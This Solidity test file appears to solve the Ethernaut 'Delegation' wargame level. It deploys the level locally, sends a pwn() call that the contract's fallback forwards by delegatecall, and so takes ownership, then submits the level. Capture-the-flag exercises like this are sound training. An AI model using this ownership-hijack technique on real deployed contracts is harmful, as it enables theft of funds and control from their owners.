pragma solidity ^0.8.19;

import "ds-test/test.sol";
import "../../src/Delegation/DelegationFactory.sol";
import "../../src/Ethernaut.sol";
import "../../src/test/utils/vm.sol";
// import "../../src/Token/NothingToSee.sol";

contract DelegateTestz is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    Delegation delegation;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testDelegatecall() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));
        // attack
        bytes memory payload = abi.encodeWithSignature("pwn()");
        address(ethernautDelegation).call(payload);
        emit log_named_address("owner after attack", ethernautDelegation.owner());
        // submit level instance
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
